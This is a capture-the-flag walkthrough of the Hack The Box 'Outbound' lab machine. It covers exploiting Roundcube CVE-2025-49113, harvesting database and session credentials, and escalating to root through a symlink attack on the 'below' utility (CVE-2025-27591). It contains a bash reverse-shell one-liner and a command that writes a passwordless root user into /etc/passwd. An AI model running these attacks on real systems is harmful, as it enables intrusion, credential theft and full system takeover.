# Box intro 
Outbound is an easy rated linux assumed-breached machine which with the starting credentials, we get access to the Roundcube webmail interface. From there, we enumerate the Roundcube version and find out that it is vulnerable to `CVE-2025–49113`, a post-authenticated PHP object deserialization vulnerability effectively giving us RCE. After getting a shell on the target. We find database credentials in the config file for the web server. Connecting to the `mysql` database and enumerating it, we find a session that belongs to Jacob user that when base64 decoded, we find an encrypted password. Using the `decrypt.sh` file in the webserver, we can decode it and get access to her Roundcube mail. From there, we get a mail containing credentials for jacob's account.  
  
Getting SSH access as jacob, and a bit of enumeration, we find out that we can run the `below` monitoring utility with root privileges. That utility is vulnerable to `CVE-2025-27591` which then we can escalate our privileges to a new user with a root-level UID
# Box info
**Name**: [Outbound](https://app.hackthebox.com/machines/Outbound/)  
**OS**: Linux  
**Creator**: [TheCyberGeek](https://app.hackthebox.com/users/114053)  
**Writeup author**: [zedd9001](https://app.hackthebox.com/users/2732230)  
## Starting Credentials
```
tyler / LhKL1o9Nm3X2
```

# Recon
## Network Enumeration
I will start this machine off with a `rustscan` scan
```
rustscan -a 10.10.11.77 -- -sC -sV -oN nmap/full-tcp.nmap
```
`-a 10.10.11.77` -> Scan the address (`-a`) of `10.10.11.77`   
`--`  -> Pass the found ports to `NMAP` and run the following `NMAP` flags  
`-sC` -> Enumerate with `NMAP`'s default scripts (`--script=default`) for basic enumeration (e.g., service info, SSL certs, and more)  
`-sV` -> Detect and enumerate version  
`-oN nmap/full-tcp.nmap` -> Output the file in a normal readable format and store it at the `nmap` directory and call it `full-tcp.nmap`  

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
It seems that SSH and HTTP is open, normal for a HTB machine. I added `outbound.htb` and `mail.outbound.htb` to my `/etc/hosts` and enumerated the web server since SSH is not usually the way in (unless you find a crazy zero day or something lmao)

## HTTP Enumeration
Since `mail.outbound.htb` is a virtual host (vhosts) of `outbound.htb`, I wanted to fuzz outbound.htb for any more virtual hosts  
FFUF command I used to scan for virtual hosts:  
```
ffuf -u 'http://outbound.htb/' -H "Host: FUZZ.outbound.htb" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -fs 154 -c
```
But there were none except `mail`  
Going to the web interface, we can see a roundcube webmail interface.  
![alt text](/assets/img/htb/outbound/login-page.png)  
I logged in with the given credentials
```
tyler / LhKL1o9Nm3X2
```
After logging in, we see we have no mail currently:  
![alt text](/assets/img/htb/outbound/tyler-emails.png)    

But clicking on the `About` page shows us version info:  
![alt text](/assets/img/htb/outbound/version-info.png)    
Interesting, let's do some researching and find out if this version is vulnerable or not
```
Roundcube Webmail 1.6.10 vulnerabilities
```
![alt text](/assets/img/htb/outbound/google-search.png)  
[Blog post](https://www.offsec.com/blog/cve-2025-49113/)
> A critical vulnerability has been discovered in Roundcube Webmail (versions < 1.5.10 and 1.6.0–1.6.10) that allows authenticated users to perform remote code execution through a PHP object deserialization flaw triggered by improper validation of the _from parameter in program/actions/settings/upload.php. The flaw carries a CVSS 3.1 score of 9.9 (Critical)

Yooo RCE already? that's rare for a HTB machine lol
I researched some more for some exploits
```
cve-2025-49113 "PoC" site:github.com
```
I used some google dorking to find CVEs  
I'll do a short explanation of what I did: 

* Look only on GitHub (site:github.com)  
* Search for repositories/files referencing the CVE ID (cve-2025-49113)  
* Try to find PoC exploit code by including "PoC"  

This is an effective way of finding PoCs on github (and for finding other stuff aswell)  

Let's click on the first link  
[Link to the exploit](https://github.com/hakaioffsec/CVE-2025-49113-exploit)  
![alt text](/assets/img/htb/outbound/google-search2.png)  

After giving the README.md and reading the source code of the exploit to make sure there's not a miner or anything like that, I then cloned the repo  
```
zack@e6~/cyber/red-team/boxes/htb/outbound/CVE-2025-49113-exploit$ php CVE-2025-49113.php 
Usage: php CVE-2025-49113.php <url> <username> <password> <command>
```
So it needs a URL first then a username and password and then a command. Seems simple enough  

Hmm, we don't get any output back. This seems to be a blind exploit (no output)
```
zack@e6~/cyber/red-team/boxes/htb/outbound/CVE-2025-49113-exploit$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "id"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```
```
zack@e6~/cyber/red-team/boxes/htb/outbound/CVE-2025-49113-exploit$ php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "sleep 5"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
[+] Gadget uploaded successfully!
```
The exploit does indeed work, because the "Exploiting" phase took longer
Maybe 5 seconds longer but I didn't count it (i'm sorryr)
## Shell as `www-data`
Anyways let's get a reverse shell
```
php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.xx.xx/444
4 0>&1'"
[+] Starting exploit (CVE-2025-49113)...
[*] Checking Roundcube version...
[*] Detected Roundcube version: 10610
[+] Target is vulnerable!
[+] Login successful!
[*] Exploiting...
```
Looking at my tab where there's penelope: 
```
[+] Got reverse shell from mail.outbound.htb~10.10.11.77-Linux-x86_64 😍️ Assigned SessionID <2>
www-data@mail:/$ 
``` 
Great! We have a reverse shell as `www-data`  

After enumerating a bit, we see database credentials in the config file
```
www-data@mail:/var/www/html/roundcube/config$ cat config.inc.php
cat config.inc.php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

roundcube:RCDBPass2025
## Accessing the `mysql` database
```
www-data@mail:/var/www/html/roundcube/config$ mysql -u roundcube -h localhost -p
mysql -u roundcube -p
Enter password: RCDBPass2025
```
```
MariaDB [(none)]> SHOW DATABASES;
S
HOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| roundcube          |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> 
MariaDB [(none)]> use roundcube;
use roundcube;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [roundcube]> 

MariaDB [roundcube]> select * from users;
select * from users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-06-11 07:52:49 | 2025-11-23 10:23:09 |                    3 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-11-23 12:50:07 | 2025-11-23 07:32:13 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"A12WCuSzkFSsGTkP";i:0;b:0;} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
3 rows in set (0.000 sec)
```
Nothing interesting in the users table  
Let's see session instead
```
select * from session;
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```
Woah that's a lot of data, and its in base64?  
Decoding the vars variable: 
```
zack@e6~$ echo 'bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE
6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MD
 < SNIP > 
zOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7' | base64 -d
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i
```
So this is jacobs username, and theres a base64 encoded encrypted password?   
After doing some researching on how to decode this, there is a `decrypt.sh` file in roundcube that we can use to decode this  

Make sure to not decode the base64 encoded string though before this  

```
www-data@mail:/var/www/html/roundcube$ bin/decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
k25Am/crypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk
595mO8DmwGeD
```
Let's see if this password works for SSH:
```
zack@e6~$ nxc ssh outbound.htb -u 'jacob' -p '595mO8DmwGeD'
SSH         10.10.11.77     22     outbound.htb     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12
SSH         10.10.11.77     22     outbound.htb     [-] jacob:595mO8DmwGeD
```
Hmm, it doesn't work... Maybe it works for the webmail interface? I logged in and boom! It worked!  
![alt text](/assets/img/htb/outbound/jacob-emails.png)  
We have two emails  
One of them containing credentials!  
![alt text](/assets/img/htb/outbound/jacobs-password.png)  
```
zack@e6~$ nxc ssh outbound.htb -u 'jacob' -p 'gY4Wr3a1evp4'
SSH         10.10.11.77     22     outbound.htb     [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.12
SSH         10.10.11.77     22     outbound.htb     [+] jacob:gY4Wr3a1evp4  Linux - Shell access!
``` 
They work!
# Shell as jacob
```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below
        --debug*, !/usr/bin/below -d*
```
So we can run below with sudo but with some limitations (we can't run --config, --debug or -d)  
# Privilege Escalation to root
Searching for CVEs in below finds [CVE-2025-27591](https://nvd.nist.gov/vuln/detail/CVE-2025-27591):  
> A privilege escalation vulnerability existed in the Below service prior to v0.9.0 due to the creation of a world-writable directory at /var/log/below. This could have allowed local unprivileged users to escalate to root privileges through symlink attacks that manipulate files such as /etc/shadow.

There are multiples PoCs for this, but I did this manually to understand it better
This github repo does an excellent job at explaining it: [Link to repo](https://github.com/dollarboysushil/Linux-Privilege-Escalation-CVE-2025-27591)
```
jacob@outbound:~$ rm -f /var/log/below/error_root.log
# Remove existing error_root.log in /var/log/below

ln -s /etc/passwd /var/log/below/error_root.log
# Create a symlink to /etc/passwd

ls -la /var/log/below/error_root.log
# This should show error_root.log -> /etc/passwd

sudo /usr/bin/below record
# Trigger log write as root, this is the core of the exploit
# This command is expected to fail or timeout

# Overwrite /etc/passwd via symlink
echo 'zedd9001::0:0:zedd9001:/root:/bin/bash' > /etc/passwd


# Login as new root user
su - zedd9001

lrwxrwxrwx 1 jacob jacob 11 Nov 23 13:54 /var/log/below/error_root.log -> /etc/passwd
Nov 23 13:54:26.549 DEBG Starting up!
Nov 23 13:54:26.549 ERRO 
----------------- Detected unclean exit ---------------------
Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01763856000: EAGAIN: Try again
-------------------------------------------------------------
zedd9001@outbound:~# 
```
# Thoughts
This was a nice linux box which is easy but not too easy aswell. Outbound forces you to learn new things and thats what I like about it
